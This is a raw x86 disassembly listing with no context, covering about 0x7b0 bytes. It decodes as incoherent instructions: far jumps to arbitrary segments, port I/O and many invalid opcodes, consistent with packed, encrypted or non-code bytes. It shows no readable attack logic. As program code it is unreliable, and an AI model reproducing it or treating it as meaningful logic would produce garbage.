  412c13:	rol    DWORD PTR [ebp+0x22],0x61
  412c17:	inc    ecx
  412c18:	mov    ebx,0xe76cb3d8
  412c1d:	sar    BYTE PTR [ebx],0xb0
  412c20:	push   ebp
  412c21:	pop    es
  412c22:	xchg   esp,eax
  412c23:	aad    0x6c
  412c25:	push   eax
  412c26:	xor    dl,BYTE PTR [edi-0x36]
  412c29:	stc    
  412c2a:	ret    
  412c2b:	pop    es
  412c2c:	les    ebp,FWORD PTR [edi-0x73883813]
  412c32:	pop    eax
  412c33:	hlt    
  412c34:	cld    
  412c35:	test   al,0xdf
  412c37:	aam    0x96
  412c39:	add    eax,0x6ddf08fe
  412c3e:	xor    al,0x2b
  412c40:	mov    BYTE PTR [ebx+0x75],al
  412c43:	mov    BYTE PTR [ecx+edx*4],al
  412c46:	mov    esp,0xb55705a0
  412c4b:	sar    BYTE PTR [edi],cl
  412c4d:	clc    
  412c4e:	outs   dx,BYTE PTR ds:[esi]
  412c4f:	mov    ah,BYTE PTR [ebp-0x4e]
  412c52:	jg     0x412ca9
  412c54:	in     al,0x5c
  412c56:	pop    esp
  412c57:	and    BYTE PTR [ebp-0x13164c65],al
  412c5d:	dec    ecx
  412c5e:	cld    
  412c5f:	std    
  412c60:	push   ecx
  412c61:	out    0x26,eax
  412c63:	test   al,0xed
  412c65:	or     eax,0xb9411946
  412c6a:	outs   dx,BYTE PTR ds:[esi]
  412c6b:	in     al,0xf1
  412c6d:	inc    ebx
  412c6e:	stos   DWORD PTR es:[edi],eax
  412c6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412c70:	mov    edi,0x731771e5
  412c75:	icebp  
  412c76:	sub    al,0xf5
  412c78:	pop    esi
  412c79:	jmp    0xd188:0x6279d14a
  412c80:	sub    eax,0x7a95cba7
  412c85:	push   ebp
  412c86:	shl    BYTE PTR [ebp+0x6eef9355],0x5e
  412c8d:	jle    0x412cfd
  412c8f:	xchg   dl,bl
  412c91:	pop    edx
  412c92:	push   ds
  412c93:	gs (bad) 
  412c95:	fwait
  412c96:	popf   
  412c97:	inc    ecx
  412c98:	inc    edi
  412c99:	xchg   ebx,eax
  412c9a:	into   
  412c9b:	cmp    eax,0x9ac9d0e1
  412ca0:	and    DWORD PTR [ecx+0x28],esi
  412ca3:	and    edx,edx
  412ca5:	je     0x412d0b
  412ca7:	clc    
  412ca8:	das    
  412ca9:	mov    edx,0x43a53014
  412cae:	push   cs
  412caf:	dec    edi
  412cb0:	je     0x412ccf
  412cb2:	xchg   edx,eax
  412cb3:	mov    dh,0xac
  412cb5:	inc    esi
  412cb6:	iret   
  412cb7:	push   ecx
  412cb8:	outs   dx,DWORD PTR ds:[esi]
  412cb9:	add    al,0xe2
  412cbb:	dec    esp
  412cbc:	jb     0x412c47
  412cbe:	and    eax,0x2ebb534d
  412cc3:	inc    ecx
  412cc4:	push   0xda0f21a4
  412cc9:	fisubr DWORD PTR [esi+0x16]
  412ccc:	and    al,dl
  412cce:	push   es
  412ccf:	inc    BYTE PTR [esi-0x26]
  412cd2:	sub    DWORD PTR [edx],esp
  412cd4:	frstor [ebx+0x4a]
  412cd7:	cmp    DWORD PTR [ebp+0x56bcb8be],edi
  412cdd:	and    al,0x6b
  412cdf:	mov    ecx,0x29b37a91
  412ce4:	pop    ss
  412ce5:	popf   
  412ce6:	sub    bh,bl
  412ce8:	ret    0x2570
  412ceb:	jmp    0x412ce1
  412ced:	fs nop
  412cef:	cmp    BYTE PTR [ecx-0x8],bh
  412cf2:	or     eax,DWORD PTR [ebx]
  412cf4:	sub    ch,ah
  412cf6:	pop    esi
  412cf7:	(bad)  
  412cf8:	sti    
  412cf9:	popa   
  412cfa:	push   esp
  412cfb:	loop   0x412cb2
  412cfd:	mov    esi,DWORD PTR [edi-0x12]
  412d00:	xchg   ecx,eax
  412d01:	pop    esp
  412d02:	and    DWORD PTR [ebp-0x2d],edx
  412d05:	jne    0x412cf5
  412d07:	push   esp
  412d08:	xchg   edx,eax
  412d09:	push   0xf9ede299
  412d0e:	push   0x21
  412d10:	inc    edi
  412d11:	sbb    BYTE PTR [ebx-0x17],0x54
  412d15:	xchg   ebx,eax
  412d16:	xor    ecx,DWORD PTR [eax-0x3a]
  412d19:	sub    bh,BYTE PTR [eax]
  412d1b:	out    dx,eax
  412d1c:	pop    esp
  412d1d:	(bad)  
  412d1e:	shl    DWORD PTR ds:0xa1cec446,1
  412d24:	rcr    DWORD PTR [esi],1
  412d26:	jg     0x412d46
  412d28:	jno    0x412d27
  412d2a:	push   edx
  412d2b:	or     ebp,DWORD PTR [edi-0x68]
  412d2e:	and    edi,0x1
  412d31:	(bad)  
  412d32:	jbe    0x412cc0
  412d34:	arpl   cx,cx
  412d36:	stos   BYTE PTR es:[edi],al
  412d37:	sbb    eax,0x44ec6125
  412d3c:	add    al,0xdc
  412d3e:	adc    edi,ecx
  412d40:	xlat   BYTE PTR ds:[ebx]
  412d41:	stos   BYTE PTR es:[edi],al
  412d42:	and    BYTE PTR [ebx+ebp*2-0x2d],cl
  412d46:	lds    edx,FWORD PTR [eax-0xa]
  412d49:	gs dec ebp
  412d4b:	imul   eax,DWORD PTR [esi+0x3f],0xcbbe3108
  412d52:	icebp  
  412d53:	pusha  
  412d54:	fdiv   QWORD PTR [edx]
  412d56:	push   ebx
  412d57:	push   edi
  412d58:	mov    edx,0x491c857a
  412d5d:	int3   
  412d5e:	sub    al,bh
  412d60:	push   0x91fee00a
  412d65:	push   esp
  412d66:	jecxz  0x412cfa
  412d68:	sub    dl,dl
  412d6a:	sub    dh,BYTE PTR [edx+0xf57bbf]
  412d70:	lods   eax,DWORD PTR ds:[esi]
  412d71:	fiadd  WORD PTR [esi+0x56]
  412d74:	adc    DWORD PTR [eax+0x3c4761c],0xa42bf67
  412d7e:	mov    ebx,ds
  412d80:	mov    ds:0x3f0b53a7,eax
  412d85:	push   eax
  412d86:	ror    DWORD PTR [edx],0x24
  412d89:	jns    0x412d59
  412d8b:	jecxz  0x412d11
  412d8d:	or     al,0xaa
  412d8f:	mov    WORD PTR [edi],?
  412d91:	outs   dx,DWORD PTR ds:[esi]
  412d92:	mov    gs,esi
  412d94:	jg     0x412dc0
  412d96:	cmc    
  412d97:	ins    DWORD PTR es:[edi],dx
  412d98:	add    ch,ch
  412d9a:	data16 cld 
  412d9c:	sbb    DWORD PTR [ecx+0x4bd34606],ebp
  412da2:	inc    esp
  412da3:	mov    ds,WORD PTR [edx-0x37]
  412da6:	ret    
  412da7:	mov    eax,0x8f7a228e
  412dac:	scas   al,BYTE PTR es:[edi]
  412dad:	push   es
  412dae:	call   0x3b7c:0x8f7f443
  412db5:	xor    esp,DWORD PTR [eax-0x5945d183]
  412dbb:	lahf   
  412dbc:	sti    
  412dbd:	ins    BYTE PTR es:[edi],dx
  412dbe:	jnp    0x412d7b
  412dc0:	push   ss
  412dc1:	jp     0x412d73
  412dc3:	test   al,0x79
  412dc5:	lea    ebp,[edx-0x47c4dc4c]
  412dcb:	js     0x412e37
  412dcd:	cld    
  412dce:	push   edi
  412dcf:	mov    dl,0x43
  412dd1:	push   ebp
  412dd2:	mov    ebx,0x20171218
  412dd7:	mov    ds:0x67980d3f,al
  412ddc:	sbb    al,0x6a
  412dde:	int3   
  412ddf:	lods   al,BYTE PTR ds:[esi]
  412de0:	sub    cl,BYTE PTR ds:0xab5ee77d
  412de6:	int3   
  412de7:	xchg   edx,eax
  412de8:	adc    al,0xdf
  412dea:	mov    bl,0xc3
  412dec:	js     0x412e03
  412dee:	sub    BYTE PTR [ebx-0x104258f],ch
  412df4:	add    BYTE PTR [ebp+0x45],al
  412df7:	pop    ebx
  412df8:	sub    eax,0x794aa5d
  412dfd:	dec    edi
  412dfe:	scas   eax,DWORD PTR es:[edi]
  412dff:	(bad)  
  412e01:	in     eax,dx
  412e02:	or     BYTE PTR [edx+eax*2-0x17],ch
  412e06:	out    0x43,eax
  412e08:	inc    eax
  412e09:	mov    ch,0x28
  412e0b:	or     eax,0x1fdef196
  412e10:	sbb    BYTE PTR [edi-0x2f],0x58
  412e14:	scas   eax,DWORD PTR es:[edi]
  412e15:	in     eax,dx
  412e16:	imul   edi,DWORD PTR [edi+0x5d],0x2ed65e7e
  412e1d:	cmp    esp,ebx
  412e1f:	sbb    DWORD PTR ds:0xde023ed8,0x0
  412e26:	rcr    DWORD PTR [edx+0x6a],1
  412e29:	je     0x412dc8
  412e2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412e2c:	or     DWORD PTR [edi-0x579f8d43],ebp
  412e32:	(bad)
  412e35:	dec    eax
  412e36:	dec    edx
  412e37:	mov    eax,0xb0c125ff
  412e3c:	fimul  WORD PTR [edi+0x45153f21]
  412e42:	jne    0x412e5f
  412e44:	popf   
  412e45:	jmp    0x412ded
  412e47:	sbb    esp,DWORD PTR [edx+0x63]
  412e4a:	jp     0x412ec3
  412e4c:	jae    0x412e8d
  412e4e:	xor    BYTE PTR [esi+0x3],cl
  412e51:	std    
  412e52:	jmp    0x3cdf:0xbc07e69b
  412e59:	fmul   DWORD PTR [edi-0x5d]
  412e5c:	xchg   ch,ah
  412e5e:	jecxz  0x412e40
  412e60:	sub    al,0x63
  412e62:	scas   eax,DWORD PTR es:[edi]
  412e63:	iret   
  412e64:	adc    BYTE PTR [ebx],ch
  412e66:	test   ecx,0xd6f0a12d
  412e6c:	adc    BYTE PTR [esi-0x80],ch
  412e6f:	push   ebx
  412e70:	and    esi,ecx
  412e72:	mov    ebp,0x79a1d1c8
  412e77:	or     eax,0x4fa5ff25
  412e7c:	sub    dh,dl
  412e7e:	ret    0x6f04
  412e81:	xor    esi,esi
  412e83:	sbb    al,0xd8
  412e85:	js     0x412ea3
  412e87:	shl    BYTE PTR [ecx+0x193659b6],1
  412e8d:	inc    ecx
  412e8e:	fist   WORD PTR [edi+ebx*8+0x39]
  412e92:	inc    esp
  412e93:	push   es
  412e94:	add    edx,eax
  412e96:	mov    dh,0x91
  412e98:	retf   
  412e99:	sbb    DWORD PTR [edi+0x1],0xffffffa1
  412e9d:	mov    ebx,DWORD PTR ds:0x4d97ddf5
  412ea3:	jae    0x412e72
  412ea5:	inc    ebx
  412ea6:	pusha  
  412ea7:	test   DWORD PTR [eax],ebp
  412ea9:	out    0x2,al
  412eab:	in     al,dx
  412eac:	and    esp,DWORD PTR [edx+0x57c6bdc9]
  412eb2:	xlat   BYTE PTR ds:[ebx]
  412eb3:	jge    0x412ef0
  412eb5:	stos   BYTE PTR es:[edi],al
  412eb6:	push   ss
  412eb7:	arpl   WORD PTR [edx+0x5e],dx
  412eba:	xor    eax,0x138caccf
  412ebf:	cmp    DWORD PTR [edx+edi*2-0x50f1ce00],0xffffffea
  412ec7:	fcmovb st,st(3)
  412ec9:	call   0x9591:0x8229cd8d
  412ed0:	cmp    BYTE PTR [ebx+0x3620e2e7],ch
  412ed6:	(bad)  
  412ed7:	jle    0x412eea
  412ed9:	xor    eax,0xc712d31b
  412ede:	mov    edi,0xae839527
  412ee3:	push   eax
  412ee4:	jg     0x412ec8
  412ee6:	xor    BYTE PTR [ebx],bl
  412ee8:	xor    BYTE PTR [ebp+edi*8-0x3bac4201],bh
  412eef:	stos   BYTE PTR es:[edi],al
  412ef0:	or     ah,BYTE PTR [ebx+0x64ebb7f5]
  412ef6:	aam    0x0
  412ef8:	pusha  
  412ef9:	ins    BYTE PTR es:[edi],dx
  412efa:	mov    ebx,0xad90cd17
  412eff:	test   eax,0x99986fbd
  412f04:	and    al,0xaa
  412f06:	add    dh,bl
  412f08:	mov    ch,0x6a
  412f0a:	cmp    DWORD PTR [ecx-0x20dfad4e],edx
  412f10:	es (bad) 
  412f12:	xor    dl,cl
  412f14:	fwait
  412f15:	push   eax
  412f16:	pop    ss
  412f17:	rcr    BYTE PTR [ecx-0x532ff4f4],0xa0
  412f1e:	jne    0x412ed9
  412f20:	cdq    
  412f21:	arpl   WORD PTR [ebx+0x4ce1a1b0],si
  412f27:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412f28:	sbb    eax,DWORD PTR [ebx+0x6bb5678d]
  412f2e:	mov    bl,BYTE PTR [esi]
  412f30:	cmp    BYTE PTR [eax-0x53f4a6c3],ch
  412f36:	mov    al,0xa6
  412f38:	pop    eax
  412f39:	jl     0x412ec5
  412f3b:	or     BYTE PTR [edi-0x3f],cl
  412f3e:	(bad)  
  412f40:	hlt    
  412f41:	mov    esp,0xcc1a4649
  412f46:	in     eax,dx
  412f47:	(bad)  
  412f48:	sub    al,0xa6
  412f4a:	dec    ebp
  412f4b:	inc    ebx
  412f4c:	push   eax
  412f4d:	pop    ebx
  412f4e:	xchg   BYTE PTR [eax+edx*8],dl
  412f51:	pushf  
  412f52:	add    eax,0xde953d41
  412f57:	loop   0x412f89
  412f59:	es jl  0x412fc0
  412f5c:	out    dx,eax
  412f5d:	or     al,0xb4
  412f5f:	outs   dx,DWORD PTR ds:[esi]
  412f60:	dec    ebp
  412f61:	sub    al,cl
  412f63:	(bad)  
  412f64:	data16 jne 0x412f73
  412f67:	push   es
  412f68:	call   0x351a:0x2db43766
  412f6f:	sar    BYTE PTR [edi-0x66bcce53],0x82
  412f76:	ds push es
  412f78:	sub    DWORD PTR [ebp+0x9d046fe],ebx
  412f7e:	mov    esi,DWORD PTR ds:0x874baf2e
  412f84:	rol    DWORD PTR [ebx-0x31b6a216],1
  412f8a:	cwde   
  412f8b:	jle    0x412f2c
  412f8d:	xchg   ebx,eax
  412f8e:	aam    0xf3
  412f90:	sti    
  412f91:	add    edi,DWORD PTR [edx]
  412f93:	or     DWORD PTR [edx-0x6165c5de],esp
  412f99:	cmp    al,0x62
  412f9b:	dec    eax
  412f9c:	dec    ecx
  412f9e:	jno    0x41301f
  412fa0:	or     ebx,ecx
  412fa2:	lds    ebx,FWORD PTR [ebx+ecx*4]
  412fa5:	test   al,0x37
  412fa7:	call   0xc8ee:0xa7eca439
  412fae:	mov    BYTE PTR [eax-0x6a],dl
  412fb1:	jecxz  0x41301f
  412fb3:	jecxz  0x412ffd
  412fb5:	mov    ecx,0x5e3d41e4
  412fba:	adc    ebx,DWORD PTR [edx+0x2a9defc5]
  412fc0:	lods   ax,WORD PTR fs:[esi]
  412fc3:	mov    ebp,DWORD PTR [edi-0x59b40985]
  412fc9:	mov    eax,0xfe6635e3
  412fce:	mov    ebp,0xeb2ea8c9
  412fd3:	adc    esi,ecx
  412fd5:	and    al,0xfd
  412fd7:	xchg   esp,eax
  412fd8:	or     ch,dh
  412fda:	mov    BYTE PTR [ecx+edx*8],0x7d
  412fde:	sub    DWORD PTR [ecx],esi
  412fe0:	xor    dl,bh
  412fe2:	jae    0x412f75
  412fe4:	js     0x412fbf
  412fe6:	nop
  412fe7:	outs   dx,BYTE PTR ds:[esi]
  412fe8:	cwde   
  412fe9:	sub    DWORD PTR [edi+0x4939e739],eax
  412fef:	mov    al,ss:0xf866d4fa
  412ff5:	jp     0x412f95
  412ff7:	rcr    dl,1
  412ff9:	pop    esp
  412ffa:	jmp    0x41301b
  412ffc:	inc    ebx
  412ffd:	jmp    0x20f19215
  413002:	stos   DWORD PTR es:[edi],eax
  413003:	pop    ebx
  413004:	popa   
  413005:	(bad)  
  413006:	inc    ecx
  413007:	test   al,0x6c
  413009:	jge    0x412f9b
  41300b:	out    dx,eax
  41300c:	inc    ebp
  41300d:	bound  ebp,QWORD PTR [ebp+0x2e]
  413010:	jmp    0x41303d
  413012:	cmp    ebp,0xffffff92
  413015:	mov    DWORD PTR [esi+0x1d0aa968],eax
  41301b:	mov    dh,0x83
  41301d:	daa    
  41301e:	(bad)  [ebp+0x65e5a447]
  413024:	sbb    eax,0xcad699db
  413029:	retf   0x2c7d
  41302c:	cmp    eax,0xe66969a6
  413031:	ret    
  413032:	shl    edi,0xb1
  413035:	adc    eax,0xa7213085
  41303a:	xor    esi,eax
  41303c:	div    DWORD PTR [esi-0x70]
  41303f:	int3   
  413040:	add    eax,0x1465227a
  413045:	in     al,0x7c
  413047:	jbe    0x413054
  413049:	leave  
  41304a:	jp     0x413001
  41304c:	cmc    
  41304d:	out    dx,eax
  41304e:	enter  0x76d2,0x28
  413052:	dec    edi
  413053:	sbb    ecx,DWORD PTR [ebp-0x1a8552e2]
  413059:	pop    edx
  41305a:	fdivr  DWORD PTR [eax+0x746575b9]
  413060:	in     eax,dx
  413061:	add    ch,al
  413063:	mov    cl,0x57
  413065:	pop    esi
  413066:	stc    
  413067:	push   0x30
  413069:	xchg   esp,eax
  41306a:	add    eax,0x88216d6c
  41306f:	fisub  DWORD PTR [ebx+0x30]
  413072:	sub    DWORD PTR [edx],ebx
  413074:	jge    0x4130d2
  413076:	popf   
  413077:	mov    BYTE PTR [eax],al
  413079:	inc    edi
  41307a:	shl    DWORD PTR [esi],0x8e
  41307d:	bound  eax,QWORD PTR [ecx-0x753b7e65]
  413083:	inc    edi
  413084:	jmp    0xcd8c:0xe96ac1
  41308b:	pop    edi
  41308c:	jo     0x4130c9
  41308e:	jge    0x41303f
  413090:	or     al,0x3d
  413092:	aaa    
  413093:	adc    bl,BYTE PTR [edi+0x3f]
  413096:	mov    ds:0xe78ecfc7,al
  41309b:	adc    al,BYTE PTR [edi+0x582e58be]
  4130a1:	pusha  
  4130a2:	mov    ?,edx
  4130a4:	dec    ebp
  4130a5:	mov    eax,0x67572421
  4130aa:	(bad)  
  4130ac:	sub    al,0xaf
  4130ae:	push   edx
  4130af:	sub    dl,dl
  4130b1:	push   0xffffffc9
  4130b3:	fadd   DWORD PTR [ebx-0x1c401e09]
  4130b9:	int    0x96
  4130bb:	call   0xb262:0x9b8c1e2
  4130c2:	jmp    0xc32c:0xe6621cf6
  4130c9:	adc    BYTE PTR [ecx+0x6d],0xe2
  4130cd:	cmc    
  4130ce:	stos   BYTE PTR es:[edi],al
  4130cf:	int    0x32
  4130d1:	mov    BYTE PTR [eax],ah
  4130d3:	xchg   edx,eax
  4130d4:	fnstenv [edx-0x9]
  4130d7:	sar    DWORD PTR [esi],cl
  4130d9:	push   0xb0e96489
  4130de:	and    DWORD PTR [esi],ebx
  4130e0:	pushf  
  4130e1:	stos   BYTE PTR es:[edi],al
  4130e2:	es jmp 0x2c81:0xe01db88b
  4130ea:	retf   
  4130eb:	xor    BYTE PTR [eax+edx*8+0x2f],dh
  4130ef:	dec    ebx
  4130f0:	nop
  4130f1:	jbe    0x41315c
  4130f3:	(bad)  
  4130f4:	loope  0x413163
  4130f6:	dec    eax
  4130f7:	out    0x29,eax
  4130f9:	mov    ebp,eax
  4130fb:	addr16 in eax,0xa
  4130fe:	in     al,0xb6
  413100:	sbb    ecx,DWORD PTR [ecx]
  413102:	cmp    al,0xb3
  413104:	leave  
  413105:	adc    bh,BYTE PTR [edi*8+0x29f33d81]
  41310c:	sahf   
  41310d:	div    bl
  41310f:	cli    
  413110:	ins    BYTE PTR es:[edi],dx
  413111:	push   esi
  413112:	fs stos DWORD PTR es:[edi],eax
  413114:	adc    dh,bh
  413116:	add    esp,DWORD PTR [ecx-0x12]
  413119:	mov    al,ds:0xbf27330a
  41311e:	mov    esp,0xa59678f8
  413124:	dec    ecx
  413125:	xchg   edi,eax
  413126:	stos   DWORD PTR es:[edi],eax
  413127:	adc    ebx,0xfba9a0ca
  41312d:	clc    
  41312e:	mov    eax,0xce968c8a
  413133:	pop    esp
  413134:	shl    al,1
  413136:	ss (bad) 
  413138:	sbb    ebp,DWORD PTR [eax+0x4a]
  41313b:	in     eax,dx
  41313c:	inc    ebx
  41313d:	cmovae esp,esi
  413140:	xchg   esp,eax
  413141:	add    al,0x81
  413143:	add    DWORD PTR [eax-0x6b],esp
  413146:	scas   eax,DWORD PTR es:[edi]
  413147:	sub    DWORD PTR [ebx],edx
  413149:	mov    esi,0x47bff154
  41314e:	adc    al,0x4b
  413150:	mov    ds:0x8ff843dc,al
  413155:	test   BYTE PTR [ecx+0x63],dh
  413158:	xor    dl,BYTE PTR [esi]
  41315a:	into   
  41315b:	mov    WORD PTR [edi],?
  41315d:	ret    0xa21d
  413160:	popf   
  413161:	mov    dl,0x64
  413163:	mov    al,0x81
  413165:	aas    
  413166:	inc    esp
  413167:	rcr    DWORD PTR [eax+esi*1-0x6c],0x9f
  41316c:	aaa    
  41316d:	xor    DWORD PTR [ebp-0x14bed379],esi
  413173:	aad    0x9c
  413175:	mov    edi,0xaf9300bf
  41317a:	jle    0x413100
  41317c:	std    
  41317d:	push   ds
  41317e:	stc    
  41317f:	xchg   sp,ax
  413181:	push   eax
  413182:	adc    bh,cl
  413184:	dec    edi
  413185:	dec    ebx
  413186:	and    eax,0xd5aa9c52
  41318b:	ror    BYTE PTR [ecx+0x6f793199],0x95
  413192:	out    dx,al
  413193:	xchg   esp,eax
  413194:	add    BYTE PTR [ebp+0x55],dl
  413197:	test   DWORD PTR [esi+eiz*2-0x37ad6c37],eax
  41319e:	jmp    0x4131d1
  4131a0:	pop    eax
  4131a1:	mov    ebp,0x22d960b3
  4131a6:	mov    ds:0xa6fb0599,al
  4131ab:	xchg   edx,eax
  4131ac:	add    DWORD PTR [ebp+esi*2-0x11024704],0x2
  4131b4:	jne    0x41322e
  4131b6:	jl     0x41319d
  4131b8:	std    
  4131b9:	sbb    DWORD PTR [edi+0x10],0xbad801f4
  4131c0:	out    0xe2,al
  4131c2:	inc    ebx
  4131c3:	stc    
  4131c4:	loop   0x4131eb
  4131c6:	clc    
  4131c7:	(bad)  
  4131c8:	js     0x4131a3
  4131ca:	mov    ebx,DWORD PTR [edx]
  4131cc:	nop
  4131cd:	pop    esi
  4131ce:	cld    
  4131cf:	sub    cl,BYTE PTR [ebp-0x7a]
  4131d2:	test   eax,0x763b67c5
  4131d7:	repz aas 
  4131d9:	ins    DWORD PTR es:[edi],dx
  4131da:	cmovg  esp,DWORD PTR [ecx+0x17]
  4131de:	xchg   ebx,eax
  4131df:	inc    ecx
  4131e0:	aas    
  4131e1:	test   ecx,esp
  4131e3:	pushf  
  4131e4:	xor    ch,BYTE PTR [edi+esi*8+0x6b75f179]
  4131eb:	arpl   WORD PTR [ecx-0x4e5c5c5b],bx
  4131f1:	pop    ebp
  4131f2:	inc    ebp
  4131f3:	xor    DWORD PTR [edx+edx*4+0x4d],ecx
  4131f7:	pop    ebp
  4131f8:	sub    al,0x35
  4131fa:	loopne 0x41327b
  4131fc:	lods   eax,DWORD PTR ds:[esi]
  4131fd:	daa    
  4131fe:	fadd   st(3),st
  413200:	(bad)  
  413201:	and    al,0xe6
  413203:	push   ebx
  413204:	inc    ebx
  413205:	jmp    0x4131cc
  413207:	xchg   edx,eax
  413208:	pop    es
  413209:	add    bh,BYTE PTR [eax]
  41320b:	outs   dx,BYTE PTR ds:[esi]
  41320c:	fidivr WORD PTR [edx]
  41320e:	push   ebx
  41320f:	dec    esp
  413210:	or     DWORD PTR [ebp+0x26d856fd],esi
  413216:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413217:	lahf   
  413218:	mov    bl,0x56
  41321a:	or     al,0x56
  41321c:	ret    
  41321d:	enter  0x4d4c,0x9e
  413221:	mov    eax,ds:0xfe2ae1cc
  413226:	xchg   ebp,eax
  413227:	adc    eax,0x58c08ac9
  41322c:	sbb    bl,BYTE PTR [ecx-0x7983e947]
  413232:	gs out 0x7d,al
  413235:	xchg   edx,eax
  413236:	cmp    ebp,DWORD PTR [esi+0x2c]
  413239:	push   ecx
  41323a:	out    0x93,al
  41323c:	dec    esp
  41323d:	dec    edx
  41323e:	aas    
  41323f:	cmp    eax,0x5cbc8297
  413244:	pop    ebp
  413245:	ins    BYTE PTR es:[edi],dx
  413246:	gs cmp al,0x17
  413249:	fs dec ecx
  41324b:	and    eax,0x3a9111e7
  413250:	std    
  413251:	add    ebp,esi
  413253:	mov    dh,0x89
  413255:	dec    ebx
  413256:	lahf   
  413257:	ret    
  413258:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413259:	sbb    edi,eax
  41325b:	out    0x6c,ax
  41325e:	push   esi
  41325f:	call   0x8c61a74b
  413264:	xchg   esi,eax
  413265:	dec    ebx
  413266:	jns    0x413212
  413268:	call   0x84c5:0x22f0d406
  41326f:	xchg   esp,eax
  413270:	push   eax
  413272:	or     BYTE PTR [edi-0x43450716],bh
  413278:	in     al,0xcf
  41327a:	scas   al,BYTE PTR es:[edi]
  41327b:	dec    esi
  41327c:	clc    
  41327d:	int3   
  41327e:	mov    BYTE PTR [edx],0xb0
  413281:	dec    eax
  413282:	and    ebx,DWORD PTR [ecx+0x27]
  413285:	stos   DWORD PTR es:[edi],eax
  413286:	pop    ss
  413287:	dec    esp
  413288:	add    eax,0xbad47da2
  41328d:	dec    eax
  41328e:	ret    
  41328f:	jp     0x41329d
  413291:	cwde   
  413292:	mov    dh,0xca
  413294:	rcr    DWORD PTR [bx],cl
  413297:	mov    al,ds:0x9393d20d
  41329c:	cwde   
  41329d:	push   0xa8311384
  4132a2:	dec    ebx
  4132a3:	int    0x10
  4132a5:	js     0x413294
  4132a7:	mov    eax,ds:0xcc4752af
  4132ac:	inc    edx
  4132ad:	in     al,0xd7
  4132af:	push   es
  4132b0:	jle    0x413243
  4132b2:	in     al,dx
  4132b3:	int3   
  4132b4:	pusha  
  4132b5:	imul   eax,DWORD PTR [ecx],0xffffffb4
  4132b8:	iret   
  4132b9:	jg     0x413327
  4132bb:	xlat   BYTE PTR ds:[ebx]
  4132bc:	imul   edi,ecx,0xfffffff3
  4132bf:	repnz mov ds:0x3aefd257,eax
  4132c5:	sbb    edi,DWORD PTR [eax-0x1b]
  4132c8:	das    
  4132c9:	icebp  
  4132ca:	lods   al,BYTE PTR ds:[esi]
  4132cb:	xlat   BYTE PTR ds:[ebx]
  4132cc:	xor    DWORD PTR [esi+ecx*8],ebp
  4132cf:	xor    BYTE PTR [ecx],bl
  4132d1:	xchg   ebx,eax
  4132d2:	add    DWORD PTR [edx+0x51],eax
  4132d5:	stos   DWORD PTR es:[edi],eax
  4132d6:	xor    al,0x12
  4132d8:	ret    
  4132d9:	sub    DWORD PTR [edx+0x4c],eax
  4132dc:	inc    edi
  4132dd:	sub    ah,dl
  4132df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4132e0:	mov    ebx,0xa19ee108
  4132e5:	adc    al,0x6c
  4132e7:	outs   dx,BYTE PTR ds:[esi]
  4132e8:	scas   eax,DWORD PTR es:[edi]
  4132e9:	retf   0x9b21
  4132ec:	or     eax,0xea9e5708
  4132f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4132f2:	ss test esp,0x4e96dcd1
  4132f9:	es sbb al,0x6c
  4132fc:	jmp    0x4132c2
  4132fe:	xor    BYTE PTR [edx-0x44],ch
  413301:	scas   al,BYTE PTR es:[edi]
  413302:	(bad)
  413305:	int    0xf7
  413307:	mov    ds:0xde6f8ff5,al
  41330c:	ret    
  41330d:	mov    al,ds:0x65d22dd6
  413312:	enter  0xb46f,0x4
  413316:	mov    eax,0xb0e73c0
  41331b:	int    0xc7
  41331d:	xor    ecx,DWORD PTR [esi]
  41331f:	dec    ebx
  413320:	jp     0x413394
  413322:	sbb    bx,WORD PTR [eax+0x71]
  413326:	sysexit 
  413328:	out    0xe8,eax
  41332a:	push   esi
  41332b:	fwait
  41332c:	cmp    ah,BYTE PTR [edx]
  41332e:	popa   
  41332f:	loop   0x41338b
  413331:	cmp    BYTE PTR [eax-0x1418f273],0xbc
  413338:	xor    ah,ch
  41333a:	xor    ch,dl
  41333c:	push   esp
  41333d:	or     bl,BYTE PTR [ecx]
  41333f:	sbb    eax,0xa32a88ad
  413344:	xchg   ax,ax
  413346:	pop    esi
  413347:	jmp    0x9c642966
  41334c:	fisubr WORD PTR ds:0xae8326c2
  413352:	mov    BYTE PTR [ebx+0x48],dh
  413355:	scas   eax,DWORD PTR es:[edi]
  413356:	sub    al,0xec
  413358:	adc    ch,BYTE PTR [edi-0x15]
  41335b:	sub    ebp,esi
  41335d:	iret   
  41335e:	adc    eax,0xb180877f
  413363:	lea    ecx,[ebp+esi*2+0xdc8a2c]
  41336a:	mov    bh,0x33
  41336c:	mov    eax,0x9a894d9
  413371:	mov    BYTE PTR [ecx-0x49],ah
  413374:	adc    ah,dl
  413376:	sub    ebx,esp
  413378:	sbb    ebx,DWORD PTR [eax+edi*4]
  41337b:	mov    esi,0x4a646f8b
  413380:	scas   eax,DWORD PTR es:[edi]
  413381:	int3   
  413382:	pushf  
  413383:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413384:	inc    ebp
  413385:	adc    eax,ebx
  413387:	fsubr  QWORD PTR [esp+eiz*4-0x35]
  41338b:	cwde   
  41338c:	ds pop edi
  41338e:	xchg   BYTE PTR [eax],cl
  413390:	cli    
  413391:	lods   al,BYTE PTR ds:[esi]
  413392:	push   edx
  413393:	(bad)  
  413394:	jg     0x4133ee
  413396:	xor    BYTE PTR [esp+ecx*1-0x5d],dl
  41339a:	xor    ecx,edx
  41339c:	xor    esi,DWORD PTR [ebx+0x6b464928]
  4133a2:	add    BYTE PTR [esi-0x5a2a9f6e],al
  4133a8:	push   eax
  4133a9:	ins    BYTE PTR es:[edi],dx
  4133aa:	dec    esi
  4133ab:	fidivr WORD PTR ds:0x85dfd18e
  4133b1:	inc    esi
  4133b2:	addr16 push ss
  4133b4:	mov    ebp,0x9eb3bf3d
  4133b9:	fist   DWORD PTR [eax-0x8]
  4133bc:	fimul  DWORD PTR [ecx+0x2c]
  4133bf:	fs repnz add edx,eax
  4133c3:	out    dx,al
  4133c4:	bound  eax,QWORD PTR [ebp+0x4f]
  4133c7:	or     BYTE PTR [esi],dh
  4133c9:	pushf  
  4133ca:	scas   al,BYTE PTR es:[di]
